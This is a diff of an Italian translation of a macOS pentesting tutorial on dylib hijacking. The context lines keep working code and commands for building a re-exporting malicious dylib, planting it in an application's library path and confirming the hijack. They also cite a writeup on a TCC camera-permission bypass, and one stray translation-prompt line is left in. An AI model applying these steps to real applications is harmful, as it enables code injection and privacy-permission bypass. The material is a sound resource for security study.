@@ -4,7 +4,7 @@
 
 ## Esempio di base di DYLD_INSERT_LIBRARIES
 
-**Library da iniettare** per eseguire una shell:
+**Libreria da iniettare** per eseguire una shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Con le informazioni precedenti sappiamo che **non sta verificando la firma delle libraries caricate** e che **sta tentando di caricare una library da**:
+Con le informazioni precedenti sappiamo che **non verifica la firma delle librerie caricate** e che **sta cercando di caricare una libreria da**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Quindi, è possibile fare un hijacking! Crea una libreria che **esegua del codice arbitrario ed esporti le stesse funzionalità** della libreria legittima, re-esportandola. E ricorda di compilarla con le versioni previste:
+Quindi, è possibile effettuare un hijack! Crea una libreria che **esegua del codice arbitrario ed esporti le stesse funzionalità** della libreria legittima, riesportandola. E ricorda di compilarla con le versioni previste:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Incolla qui il contenuto da tradurre.
+Incolla il contenuto da tradurre.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Il percorso di re-export creato nella libreria è relativo al loader; modifichiamolo in un percorso assoluto verso la libreria da esportare:
+Il percorso di reexport creato nella libreria è relativo al loader; modifichiamolo in un percorso assoluto verso la libreria da esportare:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Infine, copialo semplicemente nella **posizione di hijacking**:
+Infine, copialo semplicemente nella **posizione dirottata**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-E **esegui** il binary e verifica che la **library sia stata caricata**:
+Ed **esegui** il binary e verifica che la **libreria sia stata caricata**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,11 +133,11 @@ E **esegui** il binary e verifica che la **library sia stata caricata**:
 </code></pre>
 
 > [!TIP]
-> Un ottimo writeup su come abusare di questa vulnerability per abusare dei permessi della camera di telegram è disponibile in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[1]</sup>
+> Un ottimo writeup su come abusare di questa vulnerabilità per sfruttare i permessi della fotocamera di telegram è disponibile in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
-## Bigger Scale
+## Su scala più ampia
 
-Se stai pianificando di provare a injectare libraries in binary imprevisti, potresti controllare gli event messages per scoprire quando la library viene caricata all'interno di un processo (in questo caso rimuovi il printf e l'esecuzione di `/bin/bash`).
+Se stai pensando di provare a iniettare librerie in binary imprevisti, puoi controllare i messaggi degli eventi per scoprire quando la libreria viene caricata all'interno di un processo (in questo caso rimuovi l'esecuzione di `printf` e `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
